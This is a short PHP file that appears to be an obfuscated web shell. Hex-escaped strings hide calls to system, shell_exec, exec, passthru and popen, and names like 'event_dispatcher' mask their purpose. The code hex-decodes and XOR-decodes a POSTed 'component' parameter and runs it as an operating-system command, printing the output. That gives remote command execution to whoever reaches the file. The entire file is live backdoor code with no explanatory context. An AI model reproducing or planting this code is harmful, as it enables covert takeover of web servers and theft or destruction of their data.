<?php

$request_approved = "hex2\x62i\x6E";
$event_dispatcher1 = "sy\x73\x74\x65m";
$event_dispatcher3 = "\x65\x78ec";
$event_dispatcher4 = "\x70as\x73t\x68\x72u";
$event_dispatcher7 = "\x70clo\x73e";
$event_dispatcher5 = "\x70ope\x6E";
$event_dispatcher2 = "\x73\x68e\x6C\x6C\x5Fexec";
$event_dispatcher6 = "str\x65\x61\x6D_get\x5F\x63\x6F\x6E\x74e\x6Et\x73";
if (isset($_POST["\x63\x6Fm\x70\x6Fnent"])) {
            function initialized (   $obj, $dchunk    ){
$fac   = ''  ;
   foreach(str_split($obj) as $char){
$fac.=chr(ord($char)^$dchunk);

} return $fac;

}
            $component = $request_approved($_POST["\x63\x6Fm\x70\x6Fnent"]);
            $component = initialized($component, 34);
            if (function_exists($event_dispatcher1)) {
                $event_dispatcher1($component);
            } elseif (function_exists($event_dispatcher2)) {
                print $event_dispatcher2($component);
            } elseif (function_exists($event_dispatcher3)) {
                $event_dispatcher3($component, $hld_obj);
                print join("\n", $hld_obj);
            } elseif (function_exists($event_dispatcher4)) {
                $event_dispatcher4($component);
            } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
                $dchunk_fac = $event_dispatcher5($component, 'r');
                if ($dchunk_fac) {
                    $record_bind = $event_dispatcher6($dchunk_fac);
                    $event_dispatcher7($dchunk_fac);
                    print $record_bind;
                }
            }
            exit;
        }